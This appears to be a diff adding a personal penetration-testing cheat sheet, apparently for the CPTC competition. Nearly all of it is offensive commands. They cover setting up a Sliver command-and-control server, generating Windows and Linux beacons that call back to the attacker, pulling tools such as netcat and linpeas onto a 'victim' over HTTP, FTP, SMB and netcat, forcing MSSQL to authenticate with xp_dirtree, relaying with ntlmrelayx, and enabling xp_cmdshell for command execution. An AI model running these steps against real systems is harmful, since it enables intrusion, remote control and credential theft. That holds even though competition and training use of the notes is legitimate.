@@ -1,0 +1,95 @@
+Sliver
+./sliver-server
+new-operator –name CPTC –lhost localhost
+multiplayer
+
+Then on another terminal do this
+./sliver-client import CPTC_localhost.cfg
+./sliver-client		
+and chose a name
+Then you will be connected to the server
+
+To generate a beacon for linux we do this
+	Generate --mtls <your IP> --os linux --arch amd64 --skip-symbols --save /your/current/dir --name CPTC_meow 
+
+To generate a beacon for Windows we do this
+	generate --mtls <your IP> --save /your/current/dir --skip-symbols --format exe --os windows
+
+Before sending the beacon to the victim, we will type “mtls” to start a mtls listener that the victim will connect to
+
+The we can connect to it by using the “use <thing>” command
+
+We can start a socks proxy by doing “socks5 start” and it will run off the /etc/proxychains4.conf config port
+
+We can also use this to generate a beacon
+generate beacon —seconds 5 —jitter 3 —os windows —arch amd64 —format EXECUTABLE —http <your ip>:8443 —name <name of beacon> —save /tmp/beacon.exe -G —skip-symbols
+And do https --lport 8443
+Transfer files
+# Windows
+payload to have windows machine download netcat
+curl http://10.10.10.10:80/nc64.exe -o nc.exe”
+will download nc from your machine and output it as nc.exe
+in powershell we can do 
+iwr http://<ip>:8080/test.exe -o test.exe
+if we cannot certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
+we can start up a ftp server on our attacking machine and navigate to that
+python -m pyftpdlib 21 
+ftp 10.10.10.10
+if we are transfering from the victim to us we can use a ftp server
+we need pyftpdlib
+pip install pyftpdlib
+then we are able to do this to open an ftp server
+python3 -m pyftpdlib -w
+on the windows shell we are going to just type “ftp” then “open <ip> 2121”
+then it will ask for a user and pass then we can
+put <file name>
+and get it on our linux machine
+smb servers can share files as well
+[smbserver.py](http://smbserver.py) share .
+then on client do copy \\<your IP>\share\filename
+Or
+impacket-smbserver share share -smb2support
+then on client do 
+\\<your IP>\share\filename
+# Linux
+we can also sent a file using nc
+on victim do nc -lp 3333 > linpeas.sh
+on attacker do nc 10.10.10.10 3333 < linpeas.sh
+
+
+SQL commands
+Port 1443 mssqlclient
+	impacket-mssqlclient <Domain name>/<domain user>@<IP> -windows-auth
+Then will ask for password and hit the griddy
+
+select @@version;    //gets version info (maybe vuln)
+select username;       //gets username
+select name from master.dbo.sysdatabases;   //lists out all databases
+use <db name>;          //uses database
+select * from <db name>.information_schema.tables;    //shows tables from db
+select * from <table name>    //yea  
+exec xp_dirtree ‘c:\’     //will try to list out info from that dir
+
+impacket-smbserver share share -smb2support
+exec xp_dirtree ’\\<your IP>\share’
+
+Ntlmrelayx mayhaps
+
+Ntlmrelayx -tf targets.txt -socks -smb2support  //will spawn a socks server
+Then do the exec xp_dirtree command
+Make sure you have socks4 uncommented in /etc/proxch4.cnf
+Socks4 127.0.0.1 1080
+We can do netstat -tulpan | grep 1080 to see if that is where it spawns
+
+enable_xp_cmdshell;
+RECONFIGURE;
+xp_cmdshell “whoami”
+
+PORT 3306 mysql
+Mysql -u <user> -p -h <IP>
+
+Show databases;
+Use <database>;
+Show tables;
+Describe <table>;
+Select * from <table>;
